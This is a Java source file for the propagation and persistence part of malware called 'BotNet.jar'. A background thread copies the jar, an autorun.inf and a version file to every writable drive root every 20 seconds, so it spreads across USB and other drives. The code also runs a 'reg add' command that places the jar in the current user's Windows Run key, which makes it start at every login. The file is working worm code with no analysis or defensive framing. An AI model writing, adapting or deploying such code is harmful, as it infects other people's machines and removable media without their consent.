import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.util.Scanner;

public class Copy {

    private final String autorun = "autorun.inf";
    private final String jar = "BotNet.jar";
    private final String version = "ver";
    private final long sleepTime = 20000;
    private final int ver = 1;

    private RefreshThread rt;


    File[] roots;

    public Copy(){
        rt = new RefreshThread();
        rt.start();
        autorun();
    }

    public void closeRefreshThread(){
        rt.stop();
    }

    void autorun(){
        FileSystemView fsv = FileSystemView.getFileSystemView();
        File root = new File(fsv.getHomeDirectory().getParent());
        try {
            check(root);
        } catch (IOException e) {
            e.printStackTrace();
        }

        File jar = new File(root,this.jar);

        String command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "
                + "botnet" + " /t REG_SZ /d \"" + jar.getAbsolutePath() + "\" /f";

        System.out.println(command);

        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    class RefreshThread extends Thread{
        @Override
        public void run() {
            while (true){
                refresh();
                try {
                    sleep(sleepTime);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void refresh(){
        roots = File.listRoots();
        for (int i = 0; i < roots.length; i++)
        {
            if (roots[i].canWrite())
                try {
                    check(roots[i]);
                } catch (IOException e) {

                }

        }
    }

    private void check(File root) throws IOException {
        File autorun = new File(root,this.autorun);
        File jar = new File(root,this.jar);
        File ver = new File(root,this.version);

        if (autorun.exists()&&jar.exists()&&ver.exists()){
            Scanner in = new Scanner(ver);
            if (in.nextInt()<this.ver){
                copy(new File(this.version),ver);
                copy(new File(this.jar),jar);
                copy(new File(this.autorun),autorun);
            }
        }
        else{
            jar.createNewFile();
            autorun.createNewFile();
            ver.createNewFile();
            copy(new File(this.version),ver);
            copy(new File(this.jar),jar);
            copy(new File(this.autorun),autorun);
        }
    }


private void copy(File from,File to){
    InputStream is = null;
    OutputStream os = null;
    try {
        is = new FileInputStream(from);
        os = new FileOutputStream(to);
        byte[] buffer = new byte[1024];
        int length;
        while ((length = is.read(buffer)) > 0) {
            os.write(buffer, 0, length);
        }
    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        try {
            is.close();
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
}
